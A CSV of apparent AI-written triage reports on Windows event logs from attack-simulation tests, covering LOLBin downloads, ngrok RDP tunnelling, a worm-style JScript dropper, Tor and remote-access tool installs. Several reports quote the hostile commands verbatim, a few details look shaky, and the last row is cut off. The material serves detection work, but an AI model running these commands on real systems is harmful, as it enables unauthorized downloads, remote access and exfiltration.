Directory Name,AI Response
Download a file with IMEWDBLD.exe,"Upon analysis of the provided logs, let's break down the findings by type of log:

### Application Log:
- The logs here primarily show events related to the ""Software Protection Platform Service"" and ""edgeupdate"" services being stopped. The Software Protection Platform Service log entry contains a timestamp unrelated to any deep issue from the service description. The occurrences of ""Service stopped"" events for ""edgeupdate"" at this frequency in the application log don't by themselves suggest malicious activity without evidence of failure in updates or abnormally timed executions, but it's a point to be cautious about for potential future investigation given other context within the environment.

### Sysmon Log:
- A significant amount of process creation was observed, including standard Windows processes like `svchost.exe`, `wevtutil.exe`, `conhost.exe`, and others running under high integrity levels predominantly by the `admin_test` user, which is a system user.
- Of particular note, a Powershell command executed included downloading a file from a GitHub repository using `IMEWDBLD.exe`, which could indicate a direct file download execution potentially suspicious or unauthorized:
  ```
  ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" & {$imewdbled = $env:SystemRoot + \""\\System32\\IME\\SHARED\\IMEWDBLD.exe\"", & $imewdbled https://raw.githubusercontent.com/file/file-file/master/files/data/data.yaml}
  ```
- The presence of `HOSTNAME.EXE` and `whoami.exe` being executed along with these actions without further legitimate use elevations shown can sometimes support a suspicious context depending on surrounding activity.
  
### Windows PowerShell Log:
- There is significant activity from `PowerShell` involving the same command seen in the Sysmon logs. Execution of scripts that involve downloading from an external resource such as GitHub (https://raw.githubusercontent.com/...) suggests an opportunity for exploit or injection if not intended by system administrators.
  
### Security Log:
- Regular login records for the user `admin_test` were noted, with high privileges noted in some events. NTLM authentication was noted from a local workstation. While no unauthorized or failed logon attempts were logged here, the combination of automatic use of high privileges and repeated access attempts might indicate potential redundant connections or the execution of an automatic script.

### Conclusion:
- **SUSPICIOUS**: The observations strongly suggest a need for further analysis. The execution of PowerShell commands, specifically the downloading of potentially unauthorized external content using Powershell, can be indicative of a security issue or compromised script execution and should be investigated further.
- **Recommendation**: Verify if the downloading operation and PowerShell activities were expected or authorized. Consider checking network logs or endpoint protection solutions for signs of further suspicious or lateral movement activity. Implement tighter monitoring on the admin accounts in use and verify the integrity of downloaded files to ascertain their origin and effect.

Given these observations, further investigation by the security team is recommended to validate if these operations were benign activities or part of a larger, unauthorized task being executed on `Server002`."
iwr or Invoke Web-Request download,"Upon reviewing the provided Windows event logs, several points stand out that warrant closer examination:

1. **Sysmon and Command Line Activity:**
   - There is an entry indicating execution of `cmd.exe` with a command to invoke `powershell.exe` to download a file from an external URL (`https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt`). This involves the use of `Invoke-WebRequest (iwr)` to download the file and save it as `file-license.txt` in the temp directory.
   - The execution of commands through CMD and PowerShell to interact with an external website for file download is suspicious, particularly in environments where such activity is atypical or restricted.

2. **Windows Time Service Events:**
   - There are events showing the Windows clock being adjusted via `svchost.exe` as part of the Windows Time Service. The time was adjusted back slightly multiple times in quick succession.
   - While NTP time synchronization by default system processes isn't inherently suspicious, manipulation of system time can be one technique used to bypass certain security controls or to conceal tracks.

3. **Process Execution and Creation:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are observed in Sysmon logs. These are legitimate Windows processes, but their execution context (frequency, user, and command line usage) needs to be contextualized with overall system use and policies.
   - There are a series of process creations related to Microsoft Edge updates. These appear to be legitimate update processes conducted by the NT AUTHORITY\SYSTEM user.

4. **Security Events:**
   - Security events show standard activities, mostly controlled and processed by system or trusted service accounts (e.g., LOCAL SERVICE and NT AUTHORITY\SYSTEM).

**Assessment:**
- The execution of PowerShell to download files from an external URL is the most suspicious activity noted, indicating potential misuse or early stages of a compromise.
- The repeated clock adjustments could be benign behavior due to time synchronization, but if unexplained in context, could suggest further investigation.
- The sysmon logs primarily show legitimate operations, except for the `cmd.exe` and `powershell.exe` invocation.

**Resolution: SUSPICIOUS**

**Guidance:**
1. **Investigate Further:**
   - Determine if the PowerShell activity is authorized within the organization and whether the URL being accessed is known and legitimate.
   - Review system policies regarding internet access and command execution to assess if such behavior aligns with expectations for SERVER002.
   - Examine logs thoroughly for any lateral movement or further attempts to download or execute unauthorized software.
   - Verify if similar activities correlate in timing with other unexpected actions or alerts in system logs or security monitoring tools.

2. **Containment Strategy:**
   - Temporarily restrict network access from SERVER002 to confirm containment of any potentially unauthorized connections or downloads.
   - Investigate the downloaded file (`file-license.txt`) if it exists for any signs of malicious content or scripts.

3. **Post-Incident Review:**
   - Conduct a user audit on the account `SERVER002\\admin_test` to verify recent activity and confirm that account usage aligns with standard operations.

These steps will help determine if the incident is truly benign or a false-positive understanding and allow appropriate actions to be taken based on the findings."
Lolbas replace.exe use to copy UNC file,"## Detailed Analysis

### Overview of the Provided Logs
The logs provided span multiple categories including Sysmon, System, and Application logs. They are from a system identified as Server002. The operating timeframe is on October 24, 2024, around the midday hour. The majority of logs center around typical system operations, with a notable presence of Microsoft EdgeUpdate processes.

### Key Observations

1. **Time Synchronization Event:**
   - **System Log Frequency:** The system log entry outlines the Windows Time Service selecting `time.windows.com` as the time source. This is a standard operation for a system to ensure correct timekeeping and is considered benign.

2. **Repeated Process Executions:**
   - **Sysmon Log Analysis:** A significant number of Sysmon logs revolve around the repeated invocation of `wevtutil.exe` and `conhost.exe` processes, all executed under the user `SERVER002\admin_test`. These system tools are used for event log management and console management respectively. Their usage in rapid succession can be suspicious if it reflects an automated script or an unauthorized user attempting to perform actions such as clearing event logs. However, without further context on the server's intended use and typical operations for this environment, this activity, in isolation, is not conclusive of malicious behavior.
   - **Execution with Elevated Rights:** The listed integrity level for some processes is ""High,"" which suggests they were executed with elevated privileges. This is typical for administrative tasks.

3. **Command Line Utility Activity:**
   - **Sysmon Incidents:** There is an execution of `cmd.exe` performing file deletion (with `del %TEMP%\file.cab`) followed by invoking `replace.exe` on a local network file path. The use of `cmd.exe` with file operations and networking paths could indicate a maintenance script or automated deployment. The logs lack context to ascertain whether these actions are scheduled, authorized, or part of a legitimate application deployment process, requiring more insights from system owners.

4. **Microsoft Edge Update Operations:**
   - **Recurring Edge Update Logs:** Numerous instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe` and associated helpers) run under the SYSTEM user context. The execution of regularly scheduled processes like browser updates is normal. However, the comprehensive detail of `EdgeUpdateSetup` and COM registration is not inherently suspicious without accompanying alerts or indicators suggesting tampering or exploitation attempts.

5. **PowerShell Activity:**
   - **Absence of Logs:** No PowerShell logs are provided, which can imply either no PowerShell activity occurred, or there is a configuration or collection issue. Given that PowerShell is often scrutinized for signs of scripting-based attacks, this omission may warrant ensuring monitoring is in place if PowerShell activity is common.

### Assessment of Potential Malicious Activity

- **Lack of Direct Indicators of Compromise (IOC):** While several actions could deserve further scrutiny, particularly if `wevtutil.exe` or `cmd.exe` invocations seem unusual for this host’s typical behavior. No singular entry presents a direct indicator like known malware signatures or explicit lateral movement techniques.
  
- **Microsoft Edge and System Updates:** Activity related to Microsoft Edge updating does not inherently signal malicious actions. These can be routine updates and their associated processes.

### Conclusion and Recommendations

After this assessment, the activity seems generally indicative of routine system operations with some entries necessitating further validation against known uses and schedules (especially `cmd.exe` operations).

**Resolution: SUSPICIOUS**

### Guidance on Further Steps

1. **Validation:**
   - Contact system administrators to review typical usage of `wevtutil.exe`, `replace.exe`, and command-line operations script/automation tasks.
   - Ensure that Sysmon rules are pertinent to critical behaviors, especially around log management and high-integrity commands.

2. **Monitoring and Alerting:**
   - Establish alerting on key behaviors that require heightened scrutiny, such as rapid process invocation of system management utilities or changes in their behavioral patterns.
   - Initiate logging/configuration verification for PowerShell to ensure coverage if discrepancies are discovered.

3. **Baseline Establishment:**
   - Develop a comprehensive understanding of normal operational baselines for this system to improve future detections and contextual analysis. This could involve creating activity models or using historical log analytics to differentiate between routine administration and anomaly."
DNS over HTTPS Large Query Volume,"After reviewing the provided Windows event logs across several categories, here is the detailed analysis:

### System Log:
1. **Time Synchronization Events**: Events such as Kernel-General (Event ID 1) and Time Service (Event ID 35) indicate changes in the system time. These operations are typically benign if associated with system services. The `svchost.exe` process is involved, which is a legitimate system process. Updates via time.windows.com are standard.

### Security Log:
1. **Privilege Activity (Event ID 4672)**: This log lists several high-privilege tokens being assigned to the SYSTEM account, which is standard for system-level operations. However, the `admin_test` account showing similar privileges might need further scrutiny if the business reason for these privileges isn't clear.
   
2. **Logon Activity (Event ID 4624)**: Several successful logons are recorded, including a login from the `admin_test` account using NTLM authentication from an IP address within a private network range (192.168.0.102). This could be normal depending on corporate policy but requires confirmation about the source system and user intention.

### Sysmon Log:
1. **Process Creation Events (Event ID 1)**: Frequent execution of processes like `wevtutil.exe`, `whoami.exe`, and `powershell.exe` under the `admin_test` account may be indicative of legitimate administrative tasks or potential misuse if these actions aren't documented or expected.
   
2. **PowerShell Command (concerning)**: A PowerShell script ran, making numerous HTTP requests to a Google DNS address (8.8.8.8) with randomized subdomains, which is highly suspicious. This behavior may signify an attempt at data exfiltration or other malicious activity using command-and-control techniques.

### Application Log:
1. **Edge Update Service**: Notifications regarding the stopping of the Edge Update Service appear normal in the context of application lifecycle management.

### Windows PowerShell Log:
1. **PowerShell Script Execution**: Consistent with Sysmon, PowerShell logs showcase the initiation of a script with potentially malicious intent (multiple requests to DNS through Invoke-WebRequest).

### Overall Assessment:
- **Suspicious Activity**: The PowerShell activity linked to the `admin_test` account shows signs of potentially malicious behavior. While not definitively malicious without more context, such as intent or business justification, this activity deviates from expected behavior patterns and could indicate misuse, especially in combination with the observed IP address logon events.

### Resolution Conclusion:
- **SUSPICIOUS**: The logs contain indicators that could be signs of compromise, specifically around PowerShell usage and the actions related to the `admin_test` account. It is advised to:
  1. Verify the legitimacy of the `admin_test` account activities and context of its use.
  2. Investigate the host (192.168.0.102) to confirm authorized access and assess if further action, such as endpoint isolation, is warranted.
  3. Review network traffic logs focusing on any outbound connections from the subnet associated with PowerShell activity for further malicious indicators.
  4. Ensure all security patches and updates have been applied and validate systems are running appropriate security controls such as endpoint protection and monitoring."
Run ngrok,"Upon reviewing the provided Sysmon and PowerShell logs, several entries indicate potentially malicious activity involving the use of `ngrok` for tunneling.

### Detailed Analysis:

1. **PowerShell Activity:**
   - The PowerShell log details a command execution involving `ngrok`, specifically aiming to configure and establish a tunnel for TCP connections to port 3389, which is commonly associated with Remote Desktop Protocol (RDP).
   - The command executed is: 
     ```
     powershell.exe -Command {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null; Start-Sleep -s 5 ; Stop-Job -Name Job1 | Out-Null}
     ```
   - `ngrok` being used in such a manner allows for potentially unauthorized remote access, especially when involving RDP, which poses a significant security risk.

2. **Additional Suspicious Activities:**
   - Multiple invocations of utilities like `wevtutil.exe` and `whoami.exe` are seen within a short timeframe. While not inherently malicious, their concurrent usage could indicate reconnaissance or event log tampering activities.
   - The rapid sequence of execution and the continuous spawning of `conhost.exe` processes can be reflective of scripted or automated tasks likely driven by a PowerShell script.

3. **Confirmatory Logs:**
   - The Sysmon logs corroborate the suspicious PowerShell activity, showing the process creations involved in executing `ngrok` with the intention to establish tunnels.
   - The `User` and `High` integrity level indicates that these actions were performed by a user with administrative privileges, which aligns with privilege escalation needs for tunneling RDP traffic.

### Threat and Risk Assessment:
- **Threats Identified:**
  - Use of `ngrok` to expose RDP could allow an attacker to access the system remotely, bypassing network firewalls or NAT security measures.
  - Execution patterns suggest that the activity was deliberate, scripted, and possibly automated.
  
- **Risks:**
  - Unauthorized access and potential data exfiltration or system control via the exposed RDP service.
  - Further lateral movement within the network if other systems are accessible from this host.

### Guidance and Mitigation:
- Immediately investigate the use of `ngrok` and any connections established through RDP.
- Verify if the `authtoken` parameter seen in the PowerShell command is known/authorized by the organization.
- Check network traffic logs for any unauthorized connections, especially on port 3389.
- Conduct a thorough system malware and vulnerability scan to ensure no further unauthorized activity is occurring.
- Review user access rights and enhance monitoring to detect and respond to unusual scripts or tunneling activity.

### Resolution:
- **MALICIOUS**: The presence of automated commands to configure `ngrok` for tunneling RDP traffic indicates a deliberate attempt to setup remote access, potentially bypassing security controls, and constitutes a significant security threat."
Printer Migration Command-Line Tool UNC share folder into a zip file,"The provided logs span multiple Windows event logs and provide a snapshot of system activities on ""Server002"" during a brief timeframe around October 24, 2024. Let's break down the key elements of these logs to determine if any malicious activities are present:

1. **Security Log**:
   - The Security log events primarily show Event ID 4616, which involves the synchronization of system time. The process responsible here is `svchost.exe`, running under the `LOCAL SERVICE` account. This is normal behavior for time synchronization.

2. **Sysmon Log**:
   - Several process creation events (Event ID 5) and a few command execution events (Event ID 1) are listed.
   - Processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` are observed.
   - The `cmd.exe` execution is noteworthy as it contains a command to delete a file from the `%TEMP%` directory and makes use of `PrintBrm.exe` to back up files to a local address (`127.0.0.1`). This can be indicative of an attempt to conceal activities or data exfiltration although it is operating within a local context only and not communicating externally.
   - The executing user is consistently `SERVER002\\admin_test`, which suggests local administrative activities, although it's important to verify if this is expected activity for this user.

3. **System Log**:
   - This mostly includes kernel and time synchronization activities, which align with typical system operations.
   - Time synchronization events with `time.windows.com` are common when Windows synchronizes system time using NTP (Network Time Protocol).

4. **Application Log**:
   - One entry from the Software Protection Platform Service (`sppsvc.exe`) related to rules evaluation, which is a routine operation in maintaining software licensing.

5. **Windows PowerShell Log**:
   - No notable events recorded here.

**Assessment**:
- The logs largely present typical operational activities, including time synchronization and regular process executions. The consistent appearance of processes like `svchost.exe`, `conhost.exe`, `wevtutil.exe`, and administrative tools such as `hostname.exe`, `whoami.exe`, and `cmd.exe` are characteristic of Windows operations.
- The `cmd.exe` execution with the specific command involving `del` and `PrintBrm.exe` can be a legitimate backup operation, but its atypical nature warrants a close inspection to ensure it aligns with the user’s expected activities. No direct evidence suggests external data exfiltration or privilege escalation based on available data, but further validation with the administrator regarding this activity is advised.

**Resolution**: SUSPICIOUS
- While most activities appear benign, the specific `cmd.exe` command raises suspicion due to potential file manipulation. Further investigation should be conducted to verify if this activity is legitimate and expected under the user `admin_test`. Steps to validate include:
  - Reviewing recent tasks or scripts executed by the administrator.
  - Checking for other events suggesting file access or deletion in unusual directories.
  - Verify if the backup task involving `PrintBrm.exe` is part of a scheduled task or one-off operation. 

In conclusion, given the unusual nature of the `cmd.exe` command, the resolution is **SUSPICIOUS**, necessitating further investigation to confirm legitimacy."
OSTAP Worming Activity,"Upon analysis of the event logs provided, several points of interest were noted:

1. **Time Manipulation**: 
   - The System logs indicate several `Microsoft-Windows-Kernel-General` EventID 24 and EventID 1 entries related to time change. Time adjustments can be a part of normal system operations or automated time synchronization services. However, an anomalous, frequent change might indicate suspicious activity if seen in conjunction with other malicious signs.

2. **Process Execution**:
   - In the Sysmon logs, a process `cmd.exe` is seen executing a command with complex scripting commands aimed at creating and executing a JScript file, which simulates action that can be related to a known malware technique used by worms to spread across networks. The command is suspicious due to its actions involving file manipulation and scripting:
     ```plaintext
     ""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");... & CScript.exe fileTestdata.js //E:JScript & del fileTestdata.js /Q >nul 2>&1 & del fileTestFiledata.js /Q >nul 2>&1 & popd
     ```
     This script creation and immediate execution pattern is often observed in malicious activities.

3. **High Integrity Level Processes**:
   - The `whoami.exe` and `cmd.exe` processes executed with high integrity levels, suggesting elevated privileges which, if unexpected, could indicate misuse of privileges or potential privilege escalation.
   
4. **Edge Update Processes**:
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` show processes executing typical update actions via ""Edge Update"" service, indicating legitimate software update behavior. However, a detailed review of Edge Update processes should be ensured, as attackers may attempt to hide malicious activities under the guise of legitimate updates.

5. **User Execution Context**:
   - Many entries in Sysmon logs are under the execution context `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM`, suggesting actions possibly related to administrative tasks or system updates. If `admin_test` is unauthorized for such operations, it must be further investigated.
   
### Assessment and Conclusion:
Given the findings, the event logs contain indications of potentially suspicious activity primarily due to the scripting actions executed through `cmd.exe`. This indicates the possibility of a worm-like behavior, which needs a comprehensive analysis. However, parts of the logs also encompass benign actions related to system time adjustments and scheduled updates.

### Resolution: **SUSPICIOUS**

**Next Steps:**
- Confirm the legitimacy of the `cmd.exe` execution with scripts and review its origin (user initiating the task, scheduled task, or an anomaly).
- Validate the integrity and source of the Edge Update processes.
- Investigate the user's context `admin_test` for the appropriateness of executed tasks.
- Conduct a thorough malware scan on the concerned system to ensure no active threats.
- Monitor for any further unusual activities on the network to rule out lateral movement or propagation."
DNS Long Domain Query,"Upon a detailed analysis of the provided Windows event logs, here is the evaluation of the key areas and activities observed:

### Application Logs
- The logs capture events related to the ""Software Protection Platform Service"" and ""edgeupdate"" service that has been stopped. These appear to be routine operations and do not inherently indicate suspicious or malicious activity. 

### Sysmon Logs
- A repeated invocation of `C:\Windows\System32\HOSTNAME.EXE`, `C:\Windows\System32\conhost.exe`, and `C:\Windows\System32\whoami.exe` by `admin_test` with a high integrity level is noted.
- Of particular interest is the use of PowerShell, including a script located in a temporary file path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\data-dns-domain-length.ps1`. The command line usage involves executing a PowerShell script querying domain information, which is somewhat unusual for regular administrative tasks.
- The invocation of processes from the context of PowerShell indicates a potential automated task or script being executed, which should be reviewed for legitimacy.
- Multiple executions of Microsoft Edge Update processes in various directories appear regular, depicting an update process.

### PowerShell Logs
- These logs confirm the execution of PowerShell with the script: `data-dns-domain-length.ps1`, which was crafted to query DNS with specific domain and subdomain parameters. This activity might be legitimate but unusual in a typical environment where such scripts are not ordinarily run.

### Security Logs
- The security logs detail login events for the user `admin_test`, who possesses several substantial privileges such as `SeDebugPrivilege` and `SeSystemEnvironmentPrivilege`, typically assigned to administrative users. These actions alone are not suspicious without additional context but should be monitored for potential abuse.
  
### Threat Assessment
- **PowerShell Script Execution**: The execution of a PowerShell script querying DNS in a specific manner with elevated privileges requires attention. While it could be part of a legitimate repetitive job, the unusual file path and specific nature of the script validate further investigation.
- **Multiple Elevated Executions**: The persistent high-integrity executions of utilities like `whoami.exe` and `HOSTNAME.EXE` are somewhat typical but should be corroborated with administrative tasks expected from the responsible user.

### Conclusion: SUSPICIOUS
The events and details in the logs suggest a SUSPICIOUS level due to the scripted DNS queries via PowerShell in conjunction with elevated privileges, which is not typical for standard operations. 

### Guidance for Further Action:
1. **Validate the Legitimacy of the PowerShell Script**: Investigate the origin, purpose, and authorization of the PowerShell script `data-dns-domain-length.ps1`.
2. **Cross-Verify Scheduled Tasks**: Review if this script or similar scripts are part of scheduled tasks or authorized user activities.
3. **Monitor User Activities**: Increase scrutiny on the actions associated with `admin_test` to confirm no misuse of administrative access.
4. **Review EdgeUpdate Configuration and Task Details**: Ensure that the activities concerning the EdgeUpdate process are expected and align with updates approved by the system’s policies.

This detailed analysis indicates these events require further scrutiny to ascertain their intent and legitimacy, ensuring the system’s security and integrity."
XOR Encoded data,"Upon analyzing the provided Windows event logs:

1. **Application and System logs**: These logs primarily contain routine events. The logs show time synchronization activities which are typical in a domain environment. There is a time change event recorded, but it is executed by `svchost.exe` under the `LOCAL SERVICE` account, which is normal behavior for Windows Time Service.

2. **Sysmon logs**:
   - Regular utility executions like `hostname.exe`, `whoami.exe`, and `conhost.exe` are observed, run by the `admin_test` user. These commands themselves are not suspicious if run under legitimate purposes.
   - Notably, a PowerShell script execution with suspicious command-line arguments is noted. The PowerShell script appears to be base64 encoding data and sending it to an external site (`example.com`) using `Invoke-WebRequest`. This is highly indicative of data exfiltration or unauthorized data transfer.

3. **Security logs**: These logs show authenticated access through legitimate processes. There's no recorded indication of unauthorized access or privilege escalation.

4. **Windows PowerShell logs**: These contain evidence of the execution of the PowerShell script noted in the Sysmon logs. The script attempts to encode data and send it to an external source, which supports the interpretation of potentially malicious behavior.

**Assessment**:
- **Suspicious behavior**: The PowerShell script performing encoding and making a network request to `example.com` suggests potentially malicious activity. This aligns with techniques used in data exfiltration attacks.
- **Indicators of compromise**: The use of PowerShell for data manipulation and network transfer, especially to an arbitrary external domain, is a strong indicator.

**Resolution**: **MALICIOUS**

**Guidance**:
1. Immediately isolate the affected host to prevent any further data exfiltration or unauthorized access.
2. Conduct a thorough investigation on the user's activities (`admin_test`) and any other potentially impacted systems.
3. Check network logs for any outgoing connections to `example.com` or similar domains that may indicate where data might have been exfiltrated.
4. Review any other scripts or processes initiated by the user to understand the full scope of the activity.
5. Reset credentials for the affected user accounts and review access logs for any unauthorized access attempts.
6. Deploy endpoint detection and response tools to continuously monitor for similar PowerShell script activities or network behaviors. 

The actions should be in line with the incident response plan, keeping stakeholders informed and potentially involving law enforcement if data breach regulations require it."
TeamViewer Files Detected Test on Windows,"### Analysis

I've conducted a comprehensive review of the provided Windows event logs. Here's an analysis based on detected activities:

#### PowerShell Logs
1. **PowerShell Execution**:
   - There are several PowerShell script executions (`Invoke-WebRequest`) which download the TeamViewer setup from a legitimate URL (`https://download.teamviewer.com/download/TeamViewer_Setup.exe`) and proceed to execute it silently with the `/S` flag indicating a silent installation. The logs repeatedly show these actions which seem consistent with a scripted deployment rather than manual interaction.

#### Application Logs
2. **Software Protection**:
   - Regular operations of the Software Protection Platform service were observed, indicating no anomalies in license activation or changes.

3. **Edge Update**:
   - The Microsoft Edge Update process runs and subsequently stops, which is typically expected behavior for its update mechanism.

#### Sysmon Logs
4. **Process and Service Monitoring**:
   - The logs document various processes, including legitimate system processes and Edge updates. The installation of TeamViewer with the description ""TeamViewer Remote Control Application Installer"" was started.
   - The presence of `TeamViewer_Service.exe` suggests a successful installation. Activities like the installation of virtual drivers by TeamViewer (`tv_x64.exe`) and a log entry for a task (`TVInstallRestore`) creation could potentially automate reinstallation.

5. **Tool Execution Details**:
   - Execution of batch scripts and scheduled tasks via `schtasks.exe`, indicative of automated system tasks, were observed.

#### Security Logs
6. **Account and Privileges**:
   - The logs capture typical account activity; a user `'admin_test'` exercised multiple logins with privileged access (examples: `SeSecurityPrivilege` and `SeBackupPrivilege`), typical of administrators managing systems in a domain or workgroup setup.

7. **Event IDs**:
   - Event IDs such as `4624` and `4672` denote successful logins and privilege assignments. These Event IDs occur in legitimate administrative contexts.

#### System Logs
8. **Service Install**:
   - `TeamViewer_Service.exe` was registered as a service, confirming the legitimacy of the install procedure. 
   - Time adjustment and synchronization appear normal post installation, matching typical server maintenance routines.

### Assessment

Based on the activities logged, downloading from the official TeamViewer software download page, followed by silent installation and subsequent running of the TeamViewer service denotes actions typical of a managed or automated software deployment rather than a malicious act. The absence of suspicious PowerShell commands, unexpected network connections, unknown binaries, or unauthorized privilege escalations further supports this conclusion.

### Resolution

**BENIGN**: The activities logged in the provided event logs align with administrative or automated software deployment of legitimate applications, without any definitive indication of malicious behavior. Subsequently, no active threats or risks are identified. It seems likely that the actions were undertaken in compliance with standard IT operations or software management protocols, perhaps by an IT department or authorized personnel. No further action is recommended based on these observations unless conflicting operational context suggests otherwise."
Tor Proxy Usage - Windows,"After thoroughly reviewing the provided log entries, a few points of interest emerge that warrant further attention:

**1. PowerShell Activity:**
   - Multiple PowerShell commands appear throughout the logs, particularly those using `Invoke-Expression` and encoded commands. Specifically, the execution of:
     - `powershell.exe & {invoke-expression 'cmd /c start powershell -Command {cmd /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\tor\\Tor\\tor.exe\""}'\r\nsleep -s 60\r\nstop-process -name \""tor\"" | out-null}`
     - Encoded command execution using `-encodedCommand`. Encoded commands can be considered suspicious, especially when launching from unusual directories or referencing unfamiliar executables.

**2. Execution of Tor Browser:**
   - The execution of `tor.exe` from a temporary directory is evident. This is generally unexpected activity on a corporate server unless explicitly required for operations. The method used to run Tor, from a location in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`, raises questions as it bypasses normal installation and execution paths.

**3. Concerning Processes:**
   - The logs show the execution of several system processes like `CompatTelRunner.exe`, `UsoClient.exe`, `sc.exe`, and others. While these processes might be normally expected in various system operations like updates and telemetry, the presence of multiple processes related to telemetry (`CompatTelRunner.exe`) and Windows assessments (`DeviceCensus.exe`) occurring in tightly packed sequences may suggest tampering or abnormal behavior needing additional context.

**4. Network and System Security Events:**
   - Numerous logon events (4624) and privilege escalation events (4672) are present, with high-privilege tokens. While common in administration contexts, they might indicate privilege abuse if not expected for regular operations.
  
**Assessment:**
Based on the analysis of logs, there is clear execution of potentially unwanted or unauthorized software (Tor) using PowerShell scripts and encoded commands. The context of this execution (Tor's use in anonymity or relay networks) might be either a benign use case if expected by network operations or concerning if no justification or business need exists.

**Resolution:**
- **SUSPICIOUS**: The presence of PowerShell executions of encoded scripts starting the Tor process suggests potential misuse. While definitive maliciousness is not established, this activity is sufficiently anomalous and warrants further investigation to determine its legitimacy and origin.
  
**Guidance on How to Proceed:**
1. **Verify Execution Justification**: Engage with the team responsible for Server002 and confirm the necessity or approval of Tor's use within the environment.
2. **Review User Actions**: Investigate actions and permissions for the user `SERVER002\\admin_test` identified in these logs.
3. **Enhanced Monitoring and Alerts**: Increase monitoring for PowerShell events and unexpected changes in system configurations.
4. **Security Policy Review**: Ensure appropriate security controls and policies are in place to detect undesired software execution and privilege escalations.

File Download with Sqlcmd.exe,"Upon examining the provided logs, I have identified areas of potentially suspicious activities within the Windows event logs:

1. **Windows Security Log (Event ID 4799)**:
   - There is an event indicating the use of `setup.exe` located in the Microsoft Edge update directory, which is a common location for legitimate application installations. This task was performed by the system account (`NT AUTHORITY\SYSTEM`), which generally signifies a system-level operation, typically associated with software updates or installations.

2. **Windows PowerShell Log**:
   - An entry shows the execution of PowerShell with a script designed to download data from GitHub: `powershell.exe & {sqlcmd -i https://github.com/file/file-file/raw/master/files/data/src/data.zip -o C:\\data.zip}`. The download of files from an external URL using PowerShell is a common technique used in malicious activities, such as initial access in phishing campaigns or payload delivery.

3. **Sysmon Logs**: 
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are used by the `admin_test` user account. While these applications themselves are not inherently malicious, their usage frequency in a short period can suggest they are being exploited for malicious purposes like log clearing or manipulation.
   - A PowerShell process is confirmed as running with the aforementioned potentially malicious command line. The PowerShell activity corresponds with the logs indicating it is being used to execute a script from an uncommon URL.

4. **Process Activity**:
   - The presence of processes such as `hostname.exe` and `whoami.exe` running with a high integrity level could be normal if they were run by an administrator for configuration checks; however, seen in conjunction with suspicious PowerShell activity, they could indicate privilege enumeration by unauthorized users.

### Assessment:
The logs suggest potentially malicious activity. The PowerShell session is particularly suspicious due to the outward connection attempt to download a file—specifically, this behavior aligns with tactics utilized in illicit operations to either gather information or stage further attacks. Several legitimate processes were executed, but the context in which specific PowerShell commands were run is quite concerning.

### Recommendation:
- **Resolution**: SUSPICIOUS
- **Guidance**: Conduct a deeper investigation into the PowerShell activity. Verify the legitimacy of the downloaded file and its intended use. You should also analyze any associated network logs to trace back any external communication. Ensure the integrity and security configuration for the `admin_test` account, especially looking for any signs of misuse or compromise. It may also be prudent to restrict outgoing connections and downloading abilities of such scripts unless explicitly needed. Lastly, reviewing the system and application settings for any unauthorized changes or installations is advisable.

Taking immediate steps to isolate and conduct forensic analysis on affected hosts will be critical to prevent further exploitation or data exfiltration."
AnyDesk Files Detected Test on Windows,"Upon reviewing the provided log entries, the following observations have been made:

1. **PowerShell Log Activity:**
   - There is a PowerShell script execution logged that downloads and executes a file named `AnyDesk.exe` from the AnyDesk official download site. The command is:
     ```
     powershell.exe & {Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
     $file1 = ""C:\Users\"" + $env:username + ""\Desktop\AnyDesk.exe""
     Start-Process $file1 /S;}
     ```
   - The execution of a PowerShell script downloading an executable, especially if unrecognized, can be suspicious, as PowerShell is often used to deploy malware due to its scripting flexibility.

2. **Sysmon Log Activity:**
   - The logs corroborate the execution of `AnyDesk.exe` with high integrity levels and provide details about its execution context and the parent process being PowerShell.
   - The `AnyDesk.exe` process has several events detailing its command line execution and integrity level, indicating it was executed with administrative privileges. Notably, the command line `/S` suggests it was executed silently, which can be indicative of unauthorized installations.

3. **EdgeUpdate Log Activity:**
   - Multiple log entries relate to `MicrosoftEdgeUpdate.exe`. While Edge updates typically run automatically, the frequency and context here might be unusual but not necessarily malicious. This system component often checks and installs updates, suggesting routine behavior unless correlated with any broader attack vector.

4. **Security Logs:**
   - The security log indicates a time change event, which should be correlated to administrative activities or scheduled tasks. Sudden time changes without clear operational context can be indicative of obfuscation techniques, but in this isolated context, it may not hold strong malicious indicators.

5. **Conclusions:**
   - The most significant finding is the downloading and silent execution of `AnyDesk.exe`, which could be legitimate software if installed knowingly for remote support activities. However, without context confirming legitimate usage, this typically falls into suspicious behavior due to the nature of remote desktop software's potential for misuse.

### Assessment:
- **Resolution:** SUSPICIOUS
  - The logs indicate potentially unauthorized download and execution of `AnyDesk.exe`, a legitimate software often used for remote control. This warrants further investigation to ensure that this installation was authorized and intentional. The EdgeUpdate activities appear routine but should be reviewed for any unusual deviations from the expected pattern.
  
### Guidance:
- Confirm with users or system administrators whether the actions involving `AnyDesk.exe` were authorized and necessary for legitimate work purposes.
- Ensure there are no compromised credentials or unauthorized users that have triggered the PowerShell script execution.
- Conduct a thorough review of security controls around scripting engines like PowerShell to prevent misuse.
- If unauthorized, conduct a security sweep of server integrity, check for additional signs of compromise, and consider removing or quarantining the AnyDesk application."
GoToAssist Files Detected Test on Windows,"Upon analyzing the provided logs, I have identified several points worthy of attention:

1. **Installation Events**:
   - There are log entries showing the installation of ""GoTo Opener"" via an MSI package, which is a component related to the GoToAssist/LogMeIn application suite. These entries, particularly the installed file locations (`C:\Users\ADMIN_~1\AppData\Local\Temp\...`), are consistent with typical software installations.

2. **PowerShell Activity**:
